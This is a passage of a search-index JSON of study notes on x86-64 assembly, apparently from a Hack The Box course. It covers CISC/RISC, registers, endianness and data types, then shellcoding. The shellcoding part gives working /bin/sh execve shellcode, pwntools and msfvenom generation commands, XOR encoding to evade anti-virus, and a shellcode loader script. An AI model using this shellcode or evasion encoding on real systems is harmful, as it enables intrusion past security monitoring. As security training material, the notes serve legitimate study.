past, memory and transistors were limited, so it was preferred to write shorter programs by combining multiple instructions into one.</li> </ol> <p>To enable the processors to execute complex instructions, the processor's design becomes more complicated, as it is designed to execute a vast amount of different complex instructions, each of which has its own unit to execute it.</p> <p>Furthermore, even though it takes a single instruction cycle to execute a single instruction, as the instructions are more complex, each instruction cycle takes more clock cycles. This fact leads to more power consumption and heat to execute each instruction.</p>"},{"location":"Programming/Assembly/Infrastructure%20Set%20Architectures/#risc","title":"RISC","text":"<p>The RISC architecture favors splitting instructions into minor instructions, and so the CPU is designed only to handle simple instructions. This is done to relay the optimization to the software by writing the most optimized assembly code.</p> <p>For example, the same previous <code>add r1, r2, r3</code> instruction on a RISC processor would fetch <code>r2</code>, then fetch <code>r3</code>, add them, and finally store them in <code>r1</code>. Every instruction of these takes an entire 'Fetch-Decode-Execute-Store' instruction cycle, which leads, as can be expected, to a larger number of total instructions per program, and hence a longer assembly code.</p> <p>By not supporting various types of complex instructions, RISC processors only support a limited number of instructions (<code>~200</code>) compared to CISC processors (<code>~1500</code>). So, to execute complex instructions, this has to be done through a combination of minor instructions through Assembly.</p> <p>It is said that we can build a general-purpose computer with a processor that only supports one instruction! This indicates that we can create very complex instructions using the <code>sub</code> instruction only. Can you think of how this may be achieved?</p> <p>On the other hand, an advantage of splitting complex instructions into minor ones is having all instructions of the same length either 32-bit or 64-bit long. This enables designing the CPU clock speed around the instruction length so that executing each stage in the instruction cycle would always take precisely one machine clock cycle.</p> <p>The below diagram shows how CISC instructions take a variable amount of clock cycles, while RISC instructions take a fixed amount: </p> <p>Executing each instruction stage in a single clock cycle and only executing simple instructions leads to RISC processors consuming a fraction of the power consumed by CISC processors, which makes these processors ideal for devices that run on batteries, like smartphones and laptops.</p>"},{"location":"Programming/Assembly/Infrastructure%20Set%20Architectures/#cisc-vs-risc","title":"CISC vs. RISC","text":"<p>The following table summarizes the main differences between CISC and RISC:</p> Area CISC RISC <code>Complexity</code> Favors complex instructions Favors simple instructions <code>Length of instructions</code> Longer instructions - Variable length 'multiples of 8-bits' Shorter instructions - Fixed length '32-bit/64-bit' <code>Total instructions per program</code> Fewer total instructions - Shorter code More total instructions - Longer code <code>Optimization</code> Relies on hardware optimization (in CPU) Relies on software optimization (in Assembly) <code>Instruction Execution Time</code> Variable - Multiple clock cycles Fixed - One clock cycle <code>Instructions supported by CPU</code> Many instructions (~1500) Fewer instructions (~200) <code>Power Consumption</code> High Very low <code>Examples</code> Intel, AMD ARM, Apple <p>In the past, having a longer assembly code due to a larger number of total instructions per program was a significant disadvantage for RISC processors due to the limited resources in memory and storage. However, today this is no longer as big of an issue, as memory and storage are not as expensive and limited as they used to be in the past.</p> <p>Furthermore, with new assemblers and compilers writing extremely optimized code on the software level, RISC processors are becoming faster than CISC processors, even in executing and processing heavy applications, all while consuming much less power.</p> <p>All of this is making RISC processors more common in recent years. RISC may become the dominant architecture in the upcoming years. But as we speak, the overwhelming majority of computers and servers we will be pentesting are running on Intel/AMD processors with the CISC architecture, making learning CISC assembly our priority. As the basics of all Assembly language variants are pretty similar, learning ARM Assembly should be more straightforward after completing this module.</p>"},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/","title":"Registers, Addresses, and Data Types","text":""},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/#registers","title":"Registers","text":"<p>As previously mentioned, each CPU core has a set of registers. The registers are the fastest components in any computer, as they are built within the CPU core. However, registers are very limited in size and can only hold a few bytes of data at a time. There are many registers in the x86 architecture, but we will only focus on the ones necessary for learning basic Assembly and essential for future binary exploitation.</p> <p>There are two main types of registers we will be focusing on: <code>Data Registers</code> and <code>Pointer Registers</code>.</p> Data Registers Pointer Registers <code>rax</code> <code>rbp</code> <code>rbx</code> <code>rsp</code> <code>rcx</code> <code>rip</code> <code>rdx</code> <code>r8</code> <code>r9</code> <code>r10</code> <ul> <li> <p><code>Data Registers</code> - are usually used for storing instructions/syscall arguments. The primary data registers are: <code>rax</code>, <code>rbx</code>, <code>rcx</code>, and <code>rdx</code>. The <code>rdi</code> and <code>rsi</code> registers also exist and are usually used for the instruction <code>destination</code> and <code>source</code> operands. Then, we have secondary data registers that can be used when all previous registers are in use, which are <code>r8</code>, <code>r9</code>, and <code>r10</code>.</p> </li> <li> <p><code>Pointer Registers</code> - are used to store specific important address pointers. The main pointer registers are the Base Stack Pointer <code>rbp</code>, which points to the beginning of the Stack, the Current Stack Pointer <code>rsp</code>, which points to the current location within the Stack (top of the Stack), and the Instruction Pointer <code>rip</code>, which holds the address of the next instruction.</p> </li> </ul>"},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/#sub-registers","title":"Sub-Registers","text":"<p>Each <code>64-bit</code> register can be further divided into smaller sub-registers containing the lower bits, at one byte <code>8-bits</code>, 2 bytes <code>16-bits</code>, and 4 bytes <code>32-bits</code>. Each sub-register can be used and accessed on its own, so we don't have to consume the full 64-bits if we have a smaller amount of data.</p> <p></p> <p>Sub-registers can be accessed as:</p> Size in bits Size in bytes Name Example <code>16-bit</code> <code>2 bytes</code> the base name <code>ax</code> <code>8-bit</code> <code>1 bytes</code> base name and/or ends with <code>l</code> <code>al</code> <code>32-bit</code> <code>4 bytes</code> base name + starts with the <code>e</code> prefix <code>eax</code> <code>64-bit</code> <code>8 bytes</code> base name + starts with the <code>r</code> prefix <code>rax</code> <p>For example, for the <code>bx</code> data register, the 16-bit is <code>bx</code>, so the 8-bit is <code>bl</code>, the 32-bit would be <code>ebx</code>, and the 64-bit would be <code>rbx</code>. The same goes for pointer registers. If we take the base stack pointer <code>bp</code>, its 16-bit sub-register is <code>bp</code>, so the 8-bit is <code>bpl</code>, the 32-bit is <code>ebp</code>, and the 64-bit is <code>rbp</code>.</p> <p>The following are the names of the sub-registers for all of the essential registers in an x86_64 architecture:</p> Description 64-bit Register 32-bit Register 16-bit Register 8-bit Register Data/Arguments Registers Syscall Number/Return value <code>rax</code> <code>eax</code> <code>ax</code> <code>al</code> Callee Saved <code>rbx</code> <code>ebx</code> <code>bx</code> <code>bl</code> 1st arg - Destination operand <code>rdi</code> <code>edi</code> <code>di</code> <code>dil</code> 2nd arg - Source operand <code>rsi</code> <code>esi</code> <code>si</code> <code>sil</code> 3rd arg <code>rdx</code> <code>edx</code> <code>dx</code> <code>dl</code> 4th arg - Loop counter <code>rcx</code> <code>ecx</code> <code>cx</code> <code>cl</code> 5th arg <code>r8</code> <code>r8d</code> <code>r8w</code> <code>r8b</code> 6th arg <code>r9</code> <code>r9d</code> <code>r9w</code> <code>r9b</code> Pointer Registers Base Stack Pointer <code>rbp</code> <code>ebp</code> <code>bp</code> <code>bpl</code> Current/Top Stack Pointer <code>rsp</code> <code>esp</code> <code>sp</code> <code>spl</code> Instruction Pointer 'call only' <code>rip</code> <code>eip</code> <code>ip</code> <code>ipl</code> <p>As we go through the module, we'll discuss how to use each of these registers.</p> <p>There are other various registers, but we will not cover them in this module, as they are not needed for basic Assembly usage. As an example, there's the <code>RFLAGS</code> register, which is used to maintain various flags used by the CPU, like the zero flag <code>ZF</code>, which is used for conditional instructions.</p>"},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/#memory-addresses","title":"Memory Addresses","text":"<p>As previously mentioned, x86 64-bit processors have 64-bit wide addresses that range from <code>0x0</code> to <code>0xffffffffffffffff</code>, so we expect the addresses to be in this range. However, RAM is segmented into various regions, like the Stack, the heap, and other program and kernel-specific regions. Each memory region has specific <code>read</code>, <code>write</code>, <code>execute</code> permissions that specify whether we can read from it, write to it, or call an address in it.</p> <p>Whenever an instruction goes through the Instruction Cycle to be executed, the first step is to fetch the instruction from the address it's located at, as previously discussed. There are several types of address fetching (i.e., addressing modes) in the x86 architecture:</p> Addressing Mode Description Example <code>Immediate</code> The value is given within the instruction <code>add 2</code> <code>Register</code> The register name that holds the value is given in the instruction <code>add rax</code> <code>Direct</code> The direct full address is given in the instruction <code>call 0xffffffffaa8a25ff</code> <code>Indirect</code> A reference pointer is given in the instruction <code>call 0x44d000</code> or <code>call [rax]</code> <code>Stack</code> Address is on top of the stack <code>add rsp</code> <p>In the above table, lower is slower. The less immediate the value is, the slower it is to fetch it.</p> <p>Even though speed isn't our biggest concern when learning basic Assembly, we should understand where and how each address is located. Having this understanding will help us in future binary exploitation, with Buffer Overflow exploits, for example. The same understanding will have an even more significant implication with advanced binary exploitation, like ROP or Heap exploitation.</p>"},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/#address-endianness","title":"Address Endianness","text":"<p>An address endianness is the order of its bytes in which they are stored or retrieved from memory. There are two types of endianness: <code>Little-Endian</code> and <code>Big-Endian</code>. With Little-Endian processors, the little-end byte of the address is filled/retrieved first <code>right-to-left</code>, while with Big-Endian processors, the big-end byte is filled/retrieved first <code>left-to-right</code>.</p> <p>For example, if we have the address <code>0x0011223344556677</code> to be stored in memory, little-endian processors would store the <code>0x00</code> byte on the right-most bytes, and then the <code>0x11</code> byte would be filled after it, so it becomes <code>0x1100</code>, and then the <code>0x22</code> byte, so it becomes <code>0x221100</code>, and so on. Once all bytes are in place, they would look like <code>0x7766554433221100</code>, which is the reverse of the original value. Of course, when retrieving the value back, the processor will also use little-endian retrieval, so the value retrieved would be the same as the original value.</p> <p>Another example that shows how this can affect the stored values is binary. For example, if we had the 2-byte integer <code>426</code>, its binary representation is <code>00000001 10101010</code>. The order in which these two bytes are stored would change its value. For example, if we stored it in reverse as <code>10101010 00000001</code>, its value becomes <code>43521</code>.</p> <p>The big-endian processors would store these bytes as <code>00000001 10101010</code> <code>left-to-right</code>, while little-endian processors store them as <code>10101010 00000001</code> <code>right-to-left</code>. When retrieving the value, the processor has to use the same endianness used when storing them, or it will get the wrong value. This indicates that the order in which the bytes are stored/retrieved makes a big difference.</p> <p>The following table demonstrates how endianness works:</p> Address 0 1 2 3 4 5 6 7 Address Value Little Endian 77 66 55 44 33 22 11 00 0x Big Endian 00 11 22 33 44 55 66 77 0x <p>Address: 0x0011223344556677</p> <p>You can click on the \"Load Address\" button to visualize how each endianness loads data/addresses into memory.</p> <p>As we can see, this means that an address written in little-endian or in big-endian would refer to different locations in the memory, as it would be read differently by each processor type.</p> <p>This module will always use little-endian byte order, as it is used with Intel/AMD x86 in most modern operating systems, so the shellcode is always represented right-to-left.</p> <p><code>The important thing we need to take from this is knowing that our bytes are stored into memory from right-to-left.</code> So, if we were to push an address or a string with Assembly, we would have to push it in reverse. For example, if we want to store the word <code>Hello</code>, we would push its bytes in reverse: <code>o</code>, <code>l</code>, <code>l</code>, <code>e</code>, and finally <code>H</code>.</p> <p>This may seem a bit counter-intuitive since most people are used to reading from left-to-right. However, this has multiple advantages when processing data, like being able to retrieve a sub-register without having to go through the entire register or being able to perform arithmetic in the correct order right-to-left.</p>"},{"location":"Programming/Assembly/Registers%2C%20Addresses%2C%20and%20Data%20Types/#data-types","title":"Data Types","text":"<p>Finally, the x86 architecture supports many types of data sizes, which can be used with various instructions. The following are the most common data types we will be using with instructions:</p> Component Length Example <code>byte</code> 8 bits <code>0xab</code> <code>word</code> 16 bits - 2 bytes <code>0xabcd</code> <code>double word (dword)</code> 32 bits - 4 bytes <code>0xabcdef12</code> <code>quad word (qword)</code> 64 bits - 8 bytes <code>0xabcdef1234567890</code> <p><code>Whenever we use a variable with a certain data type or use a data type with an instruction, both operands should be of the same size.</code></p> <p>For example, we can't use a variable defined as <code>byte</code> with <code>rax</code>, as <code>rax</code> has a size of 8 bytes. In this case, we would have to use <code>al</code>, which has the same size of 1 byte. The following table shows the appropriate data type for each sub-register:</p> Sub-register Data Type <code>al</code> <code>byte</code> <code>ax</code> <code>word</code> <code>eax</code> <code>dword</code> <code>rax</code> <code>qword</code> <p>We will discuss this further in the upcoming sections. With all fundamentals of Assembly covered, we can start learning about x86 assembly instructions and writing basic Assembly code.</p>"},{"location":"Programming/Assembly/Registers/","title":"Registers","text":"Description 64-bit Register (8-bytes) 8-bit Register (1-bytes) Data/Arguments Registers Syscall Number/Return value <code>rax</code> <code>al</code> Callee Saved <code>rbx</code> <code>bl</code> 1st arg <code>rdi</code> <code>dil</code> 2nd arg <code>rsi</code> <code>sil</code> 3rd arg <code>rdx</code> <code>dl</code> 4th arg - Loop Counter <code>rcx</code> <code>cl</code> 5th arg <code>r8</code> <code>r8b</code> 6th arg <code>r9</code> <code>r9b</code> Pointer Registers Base Stack Pointer <code>rbp</code> <code>bpl</code> Current/Top Stack Pointer <code>rsp</code> <code>spl</code> Instruction Pointer 'call only' <code>rip</code> <code>ipl</code>"},{"location":"Programming/Assembly/Ressources/","title":"Ressources","text":""},{"location":"Programming/Assembly/Ressources/#courses-and-exercices","title":"Courses and exercices","text":"<ul> <li>Nightmare</li> </ul>"},{"location":"Programming/Assembly/Ressources/#linux-syscalls","title":"Linux Syscalls:","text":"<ul> <li>https://filippo.io/linux-syscall-table/</li> <li>https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</li> </ul>"},{"location":"Programming/Assembly/Ressources/#shellcodes","title":"Shellcodes","text":"<ul> <li>https://docs.pwntools.com/en/stable/shellcraft/amd64.html</li> <li>http://shell-storm.org/shellcode/</li> <li>https://www.exploit-db.com/shellcodes</li> </ul>"},{"location":"Programming/Assembly/Shellcoding%20tools/","title":"Shellcoding tools","text":"<p>We should now be able to modify our code and make it <code>shellcode</code> compatible, such that it meets all <code>Shellcoding Requirements</code>. This understanding is crucial for crafting our own shellcodes and minimizing their size, which may become very handy when dealing with Binary Exploitation, especially when we don't have a lot of room for a large shellcode.</p> <p>In certain other cases, we may not need to write our own shellcode every time, as a similar shellcode may already exist, or we can use tools to generate our shellcode, so we don't have to reinvent the wheel.</p> <p>We will come across many common shellcodes through Binary Exploitation, like a <code>Reverse Shell</code> shellcode or a <code>/bin/sh</code> shellcode. We can find many shellcodes that perform these functions, which we may be able to use with minimal or no modification. We can also use tools to generate both of these shellcodes.</p> <p><code>For either of these, we must be sure to use a shellcode that matches our target Operating System and Processor Architecture.</code></p>"},{"location":"Programming/Assembly/Shellcoding%20tools/#shell-shellcode","title":"Shell Shellcode","text":"<p>Before we continue with tools and online resources, let's try to craft our own <code>/bin/sh</code> shellcode. To do so, we can use the <code>execve</code> syscall with syscall number <code>59</code>, which allows us to execute a system application:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ man -s 2 execve\n\nint execve(const char *pathname, char *const argv[], char *const envp[]);\n</code></pre> <p>As we can see, the <code>execve</code> syscall accepts 3 arguments. We need to execute <code>/bin/sh /bin/sh</code>, which would drop us in a <code>sh</code> shell. So, we our final function to be:</p> <p>Code: c</p> <pre><code>execve(\"/bin//sh\", [\"/bin//sh\"], NULL)\n</code></pre> <p>So, we'll set our arguments as:</p> <ol> <li><code>rax</code> -&gt; <code>59</code> (<code>execve</code> syscall number)</li> <li><code>rdi</code> -&gt; <code>['/bin//sh']</code> (pointer to program to execute)</li> <li><code>rsi</code> -&gt; <code>['/bin//sh']</code> (list of pointers for arguments)</li> <li><code>rdx</code> -&gt; <code>NULL</code> (no environment variables)</li> </ol> <p>Note: We added an extra <code>/</code> in '<code>/bin//sh</code>' so that the total character count is 8, which fills up a 64-bit register, so we don't have to worry about clearing the register beforehand or dealing with any leftovers. Any extra slashes are ignored in Linux, so this is a handy trick to even the total character count when needed, and it is used a lot in binary exploitation.</p> <p>Using the same concepts we learned for calling a syscall, the following assembly code should execute the syscall we need:</p> <p>Code: nasm</p> <pre><code>global _start\n\nsection .text\n_start:\n    mov rax, 59         ; execve syscall number\n    push 0              ; push NULL string terminator\n    mov rdi, '/bin//sh' ; first arg to /bin/sh\n    push rdi            ; push to stack \n    mov rdi, rsp        ; move pointer to ['/bin//sh']\n    push 0              ; push NULL string terminator\n    push rdi            ; push second arg to ['/bin//sh']\n    mov rsi, rsp        ; pointer to args\n    mov rdx, 0          ; set env to NULL\n    syscall\n</code></pre> <p>As we can see, we pushed two (NULL-terminated) <code>'/bin//sh'</code> strings and then moved their pointers to <code>rdi</code> and <code>rsi</code>. We should know by now that the above assembly code will not produce a working shellcode since it contains NULL bytes.</p> <p><code>Try to remove all NULL bytes from the above assembly code to produce a working shellcode.</code></p> <p>We can zero-out with , and then push it for string terminators instead of pushing :</p> <p>Once we fix our code, we can run <code>shellcoder.py</code> on it, and have a shellcode with no NULL bytes:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3 shellcoder.py sh\n\nb03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05\n27 bytes - No NULL bytes\n</code></pre> <p>Try running the above shellcode with <code>loader.py</code> to see if it works and drops us in a shell. Now let's try to get another shellcode for <code>/bin/sh</code>, using shellcode generation tools.</p>"},{"location":"Programming/Assembly/Shellcoding%20tools/#shellcraft","title":"Shellcraft","text":"<p>Let's start with our usual tools, <code>pwntools</code>, and use its <code>shellcraft</code> library, which generates a shellcode for various <code>syscalls</code>. We can list <code>syscalls</code> the tool accepts as follows:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ pwn shellcraft -l 'amd64.linux'\n\n...SNIP...\namd64.linux.sh\n</code></pre> <p>We see the <code>amd64.linux.sh</code> syscall, which would drop us into a shell like our above shellcode. We can generate its shellcode as follows:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ pwn shellcraft amd64.linux.sh\n\n6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05\n</code></pre> <p>Note that this shellcode is not as optimized and short as our shellcode. We can run the shellcode by adding the <code>-r</code> flag:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ pwn shellcraft amd64.linux.sh -r\n\n$ whoami\n\nroot\n</code></pre> <p>And it works as expected. Furthermore, we can use the <code>Python3</code> interpreter to unlock <code>shellcraft</code> fully and use advanced syscalls with arguments. First, we can list all available syscalls with <code>dir(shellcraft)</code>, as follows:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3\n\n&gt;&gt;&gt; from pwn import *\n&gt;&gt;&gt; context(os=\"linux\", arch=\"amd64\", log_level=\"error\")\n&gt;&gt;&gt; dir(shellcraft)\n\n[...SNIP... 'execve', 'exit', 'exit_group', ... SNIP...]\n</code></pre> <p>Let's use the <code>execve</code> syscall like we did above to drop in a shell, as follows:</p> <p>Shellcoding Tools</p> <pre><code>&gt;&gt;&gt; syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) # syscall and args\n&gt;&gt;&gt; asm(syscall).hex() # print shellcode\n\n'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'\n</code></pre> <p>We can find a complete list of <code>x86_64</code> accepted syscalls and their arguments on this link. We can now try running this shellcode with <code>loader.py</code>:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3 loader.py '48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'\n\n$ whoami\n\nroot\n</code></pre> <p>And it works as expected.</p>"},{"location":"Programming/Assembly/Shellcoding%20tools/#msfvenom","title":"Msfvenom","text":"<p>Let's try <code>msfvenom</code>, which is another common tool we can use for shellcode generation. Once again, we can list various available payloads for <code>Linux</code> and <code>x86_64</code> with:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'\n\nlinux/x64/exec                                      Execute an arbitrary command\n...SNIP...\n</code></pre> <p>The <code>exec</code> payload allows us to execute a command we specify. Let's pass '<code>/bin/sh/</code>' for the <code>CMD</code>, and test the shellcode we get:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'\n\nNo encoder specified, outputting raw payload\nPayload size: 48 bytes\nFinal size of hex file: 96 bytes\n6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05\n</code></pre> <p>Note that this shellcode is also not as optimized and short as our shellcode. Let's try running this shellcode with our <code>loader.py</code> script:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'\n\n$ whoami\n\nroot\n</code></pre> <p>This shellcode works as well. Try testing other types of syscalls and payloads in <code>shellcraft</code> and <code>msfvenom</code></p>"},{"location":"Programming/Assembly/Shellcoding%20tools/#shellcode-encoding","title":"Shellcode Encoding","text":"<p>Another great benefit of using these tools is to encode our shellcodes without manually writing our encoders. Encoding shellcodes can become a handy feature for systems with anti-virus or certain security protections. However, it must be noted that shellcodes encoded with common encoders may be easy to detect.</p> <p>We can use <code>msfvenom</code> to encode our shellcodes as well. We can first list available encoders:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ msfvenom -l encoders\n\nFramework Encoders [--encoder &lt;value&gt;]\n======================================\n    Name                          Rank       Description\n    ----                          ----       -----------\n    cmd/brace                     low        Bash Brace Expansion Command Encoder\n    cmd/echo                      good       Echo Command Encoder\n\n&lt;SNIP&gt;\n</code></pre> <p>Then we can pick one for <code>x64</code>, like <code>x64/xor</code>, and use it with the <code>-e</code> flag, as follows:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'\n\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x64/xor\nx64/xor succeeded with size 87 (iteration=0)\nx64/xor chosen with final size 87\nPayload size: 87 bytes\nFinal size of hex file: 174 bytes\n4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c\n</code></pre> <p>Let's try running the encoded shellcode to see if it runs:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3 loader.py \n'4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'\n\n$ whoami\n\nroot\n</code></pre> <p>As we can see, the encoded shellcode works as well while being a little bit less detectable by security monitoring tools.</p> <p>Tip: We can encoded our shellcode multiple times with the <code>-i COUNT</code> flag, and specify the number of iterations we want.</p> <p>We see that the encoded shellcode is always significantly larger than the non-encoded one since encoding a shellcode adds a built-in decoder for runtime decoding. It may also encode each byte multiple times, which increases its size at every iteration.</p> <p>If we had a custom shellcode that we wrote, we could use <code>msfvenom</code> to encode it as well, by writing its bytes to a file and then passing it to <code>msfvenom</code> with <code>-p -</code>, as follows:</p> <p>Shellcoding Tools</p> <pre><code>Arenwald@htb[/htb]$ python3 -c \"import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))\" &gt; shell.bin\nArenwald@htb[/htb]$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' &lt; shell.bin\n\nAttempting to read payload from STDIN...\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x64/xor\nx64/xor succeeded with size 71 (iteration=0)\nx64/xor chosen with final size 71\nPayload size: 71 bytes\nFinal size of hex file: 142 bytes\n4831c94881e9fcffffff488d05efffffff48bb5a63e4e17d0bac1348315827482df8ffffffe2f4ea58acd0af59e4ac75018d8f5224df7b0d2b6d062f5ce49abc6ce1e17d0bac13\n</code></pre> <p>As we can see, our payload was encoded and became much larger as well.</p>"},{"location":"Programming/Assembly/Shellcoding/","title":"Shellcoding","text":"Command Description <code>pwn asm 'push rax' -c 'amd64'</code> Instruction to shellcode <code>pwn disasm '50' -c 'amd64'</code> Shellcode to instructions <code>python3 shellcoder.py helloworld</code> Extract binary shellcode <code>python3 loader.py '4831..0f05</code> Run shellcode <code>python assembler.py '4831..0f05</code> Assemble shellcode into binary Shellcraft <code>pwn shellcraft -l 'amd64.linux'</code> List available syscalls <code>pwn shellcraft amd64.linux.sh</code> Generate syscalls shellcode <code>pwn shellcraft amd64.linux.sh -r</code> Run syscalls shellcode Msfvenom <code>msfvenom -l payloads \\| grep 'linux/x64'</code> List available syscalls <code>msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'</code> Generate syscalls shellcode <code>msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'</code> Generate encoded syscalls shellcode <p>Shellcoding Requirements</p> <ol> <li>Does not contain variables</li> <li>Does not refer to direct memory addresses</li> <li>Does not contain any NULL bytes <code>00</code></li> </ol> <p>shellcoder.py <pre><code>\"\"\"\nExample usage:\n\npython3 shellcoder.py helloworld\n\n48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05\n\"\"\"\n\n#!/usr/bin/python3\n\nimport sys\nfrom pwn import *\n\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"error\")\n\nfile = ELF(sys.argv[1])\nshellcode = file.section(\".text\")\nprint(shellcode.hex())\n\nprint(\"%d bytes - Found NULL byte\" % len(shellcode)) if [i for i in shellcode if i == 0] else print(\"%d bytes - No NULL bytes\" % len(shellcode))\n</code></pre></p> <p>shellcoder.sh <pre><code># Example usage:\n# ./shellcoder.sh helloworld\n\n#!/bin/bash\n\nfor i in $(objdump -d $1 |grep \"^ \" |cut -f2); do echo -n $i; done; echo;\n</code></pre></p> <p>loader.py <pre><code>\"\"\"\nExample usage:\n\npython3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'\n\"\"\"\n#!/usr/bin/python3\n\nimport sys\nfrom pwn import *\n\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"error\")\n\nrun_shellcode(unhex(sys.argv[1])).interactive()\n</code></pre></p> <p>assembler.py: <pre><code>\"\"\"\nExample usage:\n\npython assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' 'helloworld'\n\"\"\"\n#!/usr/bin/python3\n\nimport sys, os, stat\nfrom pwn import *\n\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"error\")\n\nELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])\nos.chmod(sys.argv[2], stat.S_IEXEC)\n</code></pre></p> <p>Disasm Shellcode: <code>pwn disasm '' -c 'amd64'</code></p>"}]}